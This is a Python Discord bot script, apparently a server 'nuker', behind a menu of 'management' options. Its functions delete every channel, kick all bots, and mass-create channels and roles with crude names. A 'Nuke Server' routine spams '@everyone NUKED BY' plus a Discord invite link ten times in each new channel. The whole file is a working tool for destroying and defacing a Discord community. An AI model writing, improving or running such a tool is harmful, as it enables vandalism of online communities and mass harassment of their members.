import discord
import asyncio
from colorama import Fore, Style, init

init(autoreset=True)

GREEN = Fore.LIGHTGREEN_EX
YELLOW = Fore.YELLOW
RED = Fore.LIGHTRED_EX
CYAN = Fore.CYAN
RESET = Style.RESET_ALL

SUCCESS = f"{GREEN}[✓]{RESET}"
ERROR = f"{RED}[✗]{RESET}"
INFO = f"{CYAN}[i]{RESET}"
WARN = f"{YELLOW}[!]{RESET}"
ACTION = f"{GREEN}[>>]{RESET}"

INVITE_LINK = "https://discord.gg/Y4cknD6V5r"
NUKE_MESSAGE = f"@everyone NUKED BY {INVITE_LINK}"

DELAY = 0.1

intents = discord.Intents.default()
intents.guilds = True
intents.members = True

bot = discord.Client(intents=intents)

def get_input(prompt, is_int=False, valid_choices=None, allow_cancel=False):
    while True:
        val = input(f"{GREEN}{prompt}{RESET} ").strip()
        if allow_cancel and val.lower() == 'cancel':
            return 'cancel'
        if is_int:
            try:
                iv = int(val)
                if valid_choices and iv not in valid_choices:
                    print(f"{WARN} Choose from: {valid_choices}")
                elif iv <= 0 and not valid_choices:
                    print(f"{WARN} Enter positive number.")
                else:
                    return iv
            except:
                print(f"{ERROR} Invalid number.")
        else:
            if not val:
                print(f"{ERROR} Can't be empty.")
            else:
                return val

async def kick_all_bots(guild):
    print(f"{ACTION} Kicking bots from '{guild.name}'...")
    bots = [m for m in guild.members if m.bot]
    if not bots:
        print(f"{SUCCESS} No bots found.")
        return
    for b in bots:
        try:
            await b.kick(reason="Scripted kick")
            print(f"{SUCCESS} Kicked {b}")
        except discord.Forbidden:
            print(f"{WARN} No permission to kick {b}")
        except Exception as e:
            print(f"{ERROR} Error kicking {b}: {e}")
        await asyncio.sleep(DELAY)
    print(f"{SUCCESS} Done kicking bots.\n")

async def delete_all_channels(guild):
    print(f"{ACTION} Deleting all channels...")
    channels = list(guild.channels)
    if not channels:
        print(f"{SUCCESS} No channels to delete.")
        return
    for ch in channels:
        try:
            await ch.delete()
            print(f"{SUCCESS} Deleted {ch.name}")
        except discord.Forbidden:
            print(f"{WARN} No permission to delete {ch.name}")
        except Exception as e:
            print(f"{ERROR} Error deleting {ch.name}: {e}")
        await asyncio.sleep(DELAY)
    print(f"{SUCCESS} Done deleting channels.\n")

async def create_channels(guild, count):
    print(f"{ACTION} Creating {count} channels...")
    for i in range(count):
        try:
            name = f" MERO BABU K XA "
            await guild.create_text_channel(name)
            print(f"{SUCCESS} Created {name}")
        except Exception as e:
            print(f"{ERROR} Failed creating channel: {e}")
        await asyncio.sleep(DELAY)
    print(f"{SUCCESS} Created all channels.\n")

async def rename_all_channels(guild, prefix):
    print(f"{ACTION} Renaming channels...")
    channels = [ch for ch in guild.channels if isinstance(ch, (discord.TextChannel, discord.VoiceChannel))]
    if not channels:
        print(f"{WARN} No channels to rename.")
        return
    for i, ch in enumerate(channels, start=1):
        try:
            await ch.edit(name=f"{prefix} {i}")
            print(f"{SUCCESS} Renamed {ch.name} to {prefix} {i}")
        except Exception as e:
            print(f"{ERROR} Failed renaming {ch.name}: {e}")
        await asyncio.sleep(DELAY)
    print(f"{SUCCESS} Renaming done.\n")

async def create_roles(guild, count):
    print(f"{ACTION} Creating {count} roles...")
    for i in range(count):
        try:
            await guild.create_role(name=f"🔥 S*x {i+1}")
            print(f"{SUCCESS} Created role Sex {i+1}")
        except Exception as e:
            print(f"{ERROR} Failed creating role: {e}")
        await asyncio.sleep(DELAY)
    print(f"{SUCCESS} Created all roles.\n")

async def rename_all_roles(guild, prefix):
    print(f"{ACTION} Renaming roles...")
    roles = [r for r in guild.roles if not r.is_default()]
    if not roles:
        print(f"{WARN} No roles to rename.")
        return
    for i, role in enumerate(roles, start=1):
        try:
            await role.edit(name=f"{prefix} {i}")
            print(f"{SUCCESS} Renamed {role.name} to {prefix} {i}")
        except Exception as e:
            print(f"{ERROR} Failed renaming {role.name}: {e}")
        await asyncio.sleep(DELAY)
    print(f"{SUCCESS} Role renaming done.\n")

async def kill_server(guild):
    print(f"{ACTION} Nuking server: deleting all channels, creating new ones, spamming...")
    channels = list(guild.channels)
    for ch in channels:
        try:
            await ch.delete()
            print(f"{SUCCESS} Deleted {ch.name}")
        except Exception as e:
            print(f"{WARN} Failed deleting {ch.name}: {e}")
        await asyncio.sleep(DELAY)

    count = get_input("How many new channels to create?", is_int=True)
    new_channels = []

    for i in range(count):
        try:
            name = f"nuke-{INVITE_LINK.split('/')[-1]}-{i+1}"
            ch = await guild.create_text_channel(name)
            new_channels.append(ch)
            print(f"{SUCCESS} Created {name}")
        except Exception as e:
            print(f"{ERROR} Failed creating channel: {e}")
        await asyncio.sleep(DELAY)

    for ch in new_channels:
        for _ in range(10):
            try:
                await ch.send(NUKE_MESSAGE)
                print(f"{SUCCESS} Sent spam in {ch.name}")
            except Exception as e:
                print(f"{WARN} Failed sending message in {ch.name}: {e}")
            await asyncio.sleep(DELAY)

    print(f"{SUCCESS} Nuke complete.\n")

@bot.event
async def on_ready():
    print(f"{SUCCESS} Logged in as {bot.user} (ID: {bot.user.id})")
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print(f"{ERROR} Guild not found! Check GUILD_ID.")
        await bot.close()
        return

    while True:
        print(f"\n{CYAN}=== Server Management Menu ==={RESET}")
        print("1️⃣  Create Channels")
        print("2️⃣  Delete All Channels")
        print("3️⃣  Rename All Channels")
        print("4️⃣  Kick All Bots")
        print("5️⃣  Nuke Server")
        print("6️⃣  Create Roles")
        print("7️⃣  Rename All Roles")
        print("0️⃣  Exit\n")

        choice = get_input("Select option:", is_int=True, valid_choices=[0,1,2,3,4,5,6,7])

        if choice == 1:
            c = get_input("Number of channels to create:", is_int=True)
            await create_channels(guild, c)

        elif choice == 2:
            if input(f"{WARN} Confirm delete all channels? (yes/cancel): ").lower() == "yes":
                await delete_all_channels(guild)
            else:
                print(f"{INFO} Cancelled.")

        elif choice == 3:
            prefix = get_input("New channel prefix:", allow_cancel=True)
            if prefix != "cancel":
                await rename_all_channels(guild, prefix)
            else:
                print(f"{INFO} Cancelled.")

        elif choice == 4:
            if input(f"{WARN} Confirm kick all bots? (yes/cancel): ").lower() == "yes":
                await kick_all_bots(guild)
            else:
                print(f"{INFO} Cancelled.")

        elif choice == 5:
            if input(f"{WARN} Confirm nuke? Spams @everyone 10x per channel (yes/cancel): ").lower() == "yes":
                await kill_server(guild)
            else:
                print(f"{INFO} Cancelled.")

        elif choice == 6:
            c = get_input("Number of roles to create:", is_int=True)
            await create_roles(guild, c)

        elif choice == 7:
            prefix = get_input("New role prefix:", allow_cancel=True)
            if prefix != "cancel":
                await rename_all_roles(guild, prefix)
            else:
                print(f"{INFO} Cancelled.")

        elif choice == 0:
            print(f"{INFO} Bye 👋")
            break

    await bot.close()

if __name__ == "__main__":
    TOKEN = get_input("Enter your bot token:")
    GUILD_ID = get_input("Enter your server (guild) ID:", is_int=True)
    bot.run(TOKEN)
